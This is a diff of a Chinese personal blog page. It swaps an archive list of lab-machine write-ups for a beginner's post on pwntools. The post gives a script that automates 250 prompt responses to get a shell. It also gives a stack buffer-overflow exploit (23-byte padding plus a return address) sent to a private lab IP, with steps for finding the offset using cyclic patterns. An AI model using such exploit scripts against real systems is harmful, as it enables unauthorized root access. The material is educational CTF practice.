@@ -6,17 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2025/5 | iiiiiiiiii的博客</title>
+  <title>pwn-tool | iiiiiiiiii的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="臭双非">
-<meta property="og:type" content="website">
-<meta property="og:title" content="iiiiiiiiii的博客">
-<meta property="og:url" content="http://example.com/archives/2025/05/index.html">
+  <meta name="description" content="pwn-tools first - 第一次">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-tool">
+<meta property="og:url" content="http://example.com/2025/06/18/tool-pwn/index.html">
 <meta property="og:site_name" content="iiiiiiiiii的博客">
-<meta property="og:description" content="臭双非">
+<meta property="og:description" content="pwn-tools first - 第一次">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:\blog\source\images\tool\1.png">
+<meta property="og:image" content="d:\blog\source\images\tool\2.png">
+<meta property="og:image" content="d:\blog\source\images\tool\pwn1.png">
+<meta property="og:image" content="d:\blog\source\images\tool\pwn2.png">
+<meta property="og:image" content="d:\blog\source\images\tool\pwn3.png">
+<meta property="og:image" content="d:\blog\source\images\tool\333.png">
+<meta property="og:image" content="d:\blog\source\images\tool\334.png">
+<meta property="og:image" content="d:\blog\source\images\tool\root2.png">
+<meta property="og:image" content="d:\blog\source\images\tool\root1.png">
+<meta property="og:image" content="d:\blog\source\images\tool\stack1.png">
+<meta property="og:image" content="d:\blog\source\images\tool\%E5%81%8F%E7%A7%BB%E9%87%8F.png">
+<meta property="og:image" content="d:\blog\source\images\tool\4444.png">
+<meta property="article:published_time" content="2025-06-18T03:37:08.655Z">
+<meta property="article:modified_time" content="2025-06-18T03:50:54.423Z">
 <meta property="article:author" content="Starrui">
+<meta property="article:tag" content="分号截断">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:\blog\source\images\tool\1.png">
   
     <link rel="alternative" href="/atom.xml" title="iiiiiiiiii的博客" type="application/atom+xml">
   
@@ -163,430 +179,248 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-tool-pwn" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwn-tool
+    </h1>
+  
+
+        
+        <a href="/2025/06/18/tool-pwn/" class="archive-article-date">
+  	<time datetime="2025-06-18T03:37:08.655Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-06-18</time>
+</a>
+        
+        
+        <span class="archive-article-date">
+            阅读量 <span id="busuanzi_value_page_pv"></span>
+        </span>
+        
+      </header>
+      <div align="center" class="post-count">
+       字数：524字 | 预计阅读时长：2分钟
+     </div>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="pwn-tools-first-第一次"><a href="#pwn-tools-first-第一次" class="headerlink" title="pwn-tools first - 第一次"></a>pwn-tools first - 第一次</h2><span id="more"></span> 
+
+<p>这里因为我也是第一次玩PWN的题目所以也是看群主的视频来学习  先看步骤后面总结会解释</p>
+<p><img src="D:\blog\source\images\tool\1.png" alt="1"></p>
+<p>然后我们NC下 试试发现是一个NC 这里要输入250次经过测试</p>
+<p><img src="D:\blog\source\images\tool\2.png" alt="2"></p>
+<p>这里你可以写PY脚本 也可以用 PWN</p>
+<p><img src="D:\blog\source\images\tool\pwn1.png" alt="pwn1"></p>
+<p>这里附上代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">r=remote(&quot;172.20.10.2&quot;,1337)</span><br><span class="line">for i in range(250):</span><br><span class="line">    print(i)</span><br><span class="line">    a = r.recvuntil(b&#x27;: &#x27;).decode()</span><br><span class="line">    print(a)</span><br><span class="line">    x = re.split(&#x27;\[|\]&#x27;,a)</span><br><span class="line">    r.sendline(x[1].encode())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="D:\blog\source\images\tool\pwn2.png" alt="pwn2"></p>
+<p>拿到密码得到SHELL</p>
+<p><img src="D:\blog\source\images\tool\pwn3.png" alt="pwn3"></p>
+<p>然后这里程序我们先把发送出来 然后IDEA反编译下</p>
+<p>得到主函数然后左边有一个fun 函数点开看看</p>
+<p><img src="D:\blog\source\images\tool\333.png" alt="333"></p>
+<p>发现了要利用的函数因为主函数有一个gets没有检测输入个数我们利用下栈溢出</p>
+<p><img src="D:\blog\source\images\tool\334.png" alt="334"></p>
+<p>栈溢出代码如下</p>
+<p><img src="D:\blog\source\images\tool\root2.png" alt="root2"></p>
+<p>代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">r=remote(&quot;172.20.10.2&quot;,12345)</span><br><span class="line"></span><br><span class="line">junk = b&#x27;A&#x27; * 23</span><br><span class="line">fun = p64(0x401186)</span><br><span class="line">payload = junk + fun</span><br><span class="line"></span><br><span class="line">r.recvuntil(b&#x27;please input\n&#x27;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到ROOT</p>
+<p><img src="D:\blog\source\images\tool\root1.png" alt="root1"></p>
+<p>我们拿到了ROOT我来解释下原理</p>
+<p>当你不停的往这个数组放入数值时 满的时候他会到缓冲区拿去数据 我们就是来控制缓冲区的数据找到那个临界值爆发后我们控制的值 我们上面图算出来了是23</p>
+<p>如何计算？</p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg /opt/find_backdoor</span><br></pre></td></tr></table></figure>
+
+<p>r 然后输入一长串有规则数据生成可以使用代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;from pwn import cyclic; print(cyclic(100))&quot; </span><br><span class="line">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们放入进去</p>
+<p>可以看爆出了 ret</p>
+<p>下面那个6161686161616761是爆发值</p>
+<p><img src="D:\blog\source\images\tool\stack1.png" alt="stack1"></p>
+<p>然后我们使用工具来看偏移量是多少</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;from pwn import *; print(cyclic_find(0x6161686161616761))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>算出23 所以我们POC代码就是23个A加上函数地址</p>
+<p><img src="D:\blog\source\images\tool\偏移量.png" alt="偏移量"></p>
+<p><img src="D:\blog\source\images\tool\4444.png" alt="4444"></p>
+<h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>1：从输入的哪一位开始，覆盖了返回地址（RIP）</p>
+<p>2：当你利用栈溢出攻击程序时：你要精确填满前面的内容，<strong>刚好覆盖返回地址</strong>所以必须知道这个“偏移值”</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/1.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/1.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2025" class="archive-year">2025</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/29/ximai/" class="archive-article-date">
-  	<time datetime="2025-05-29T14:24:24.608Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-29</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/29/ximai/">ximai靶机---难度LOW-easy-知识点-wp-sqlmap-wpplugin</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">wordpress</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">分号截断</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/06/18/tool-pwn/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/28/translate/" class="archive-article-date">
-  	<time datetime="2025-05-28T14:12:05.504Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-28</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2025/06/17/insomnia/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">insomnia靶机---难度easy知识点-分号截断</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/28/translate/">受益匪浅translate靶机---难度LOW-easy-知识点-tmp-定时任务-socat</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">tmp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">定时任务</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">socat</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-tools-first-%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="toc-number">1.</span> <span class="toc-text">pwn-tools first - 第一次</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">总结一下</span></a></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/28/baseme/" class="archive-article-date">
-  	<time datetime="2025-05-28T03:12:12.592Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-28</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/28/baseme/">baseme靶机---难度LOW-知识点-爆破ssh密钥-base64语法-</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ssh2john</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">base64</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/26/connection/" class="archive-article-date">
-  	<time datetime="2025-05-26T09:00:14.359Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/26/connection/">connection靶机---难度LOW-知识点-smb-enm4linux</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">smb</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/26/dayao/" class="archive-article-date">
-  	<time datetime="2025-05-26T01:22:08.636Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/26/dayao/">大窑dayao靶机---难度LOW-知识点-tftp-udp-定时任务</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">creatab</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">tftp</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/23/infected/" class="archive-article-date">
-  	<time datetime="2025-05-23T08:53:53.041Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/23/infected/">VUlNyx-infected靶机---难度LOW-知识点-backdoor-module</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">module</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/22/agent/" class="archive-article-date">
-  	<time datetime="2025-05-22T00:43:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/22/agent/">Vulnyx-agent靶机-LOW-知识点-Agent-dirb工具</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Agent</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">dirb</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/19/Qingmei/" class="archive-article-date">
-  	<time datetime="2025-05-19T04:21:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/19/Qingmei/">群友Qingmei靶机-LOW-知识点-SSH</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SSH</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/19/Commit/" class="archive-article-date">
-  	<time datetime="2025-05-19T00:23:59.644Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/19/Commit/">Commit靶机---难度LOW-知识点-bash_history</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">bash_history</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SSH</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2025/05/17/Loweeeeee/" class="archive-article-date">
-  	<time datetime="2025-05-17T06:46:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-05-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/05/17/Loweeeeee/">Loower靶机---难度LOW-知识点-SSH观察</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SSH</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -628,8 +462,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
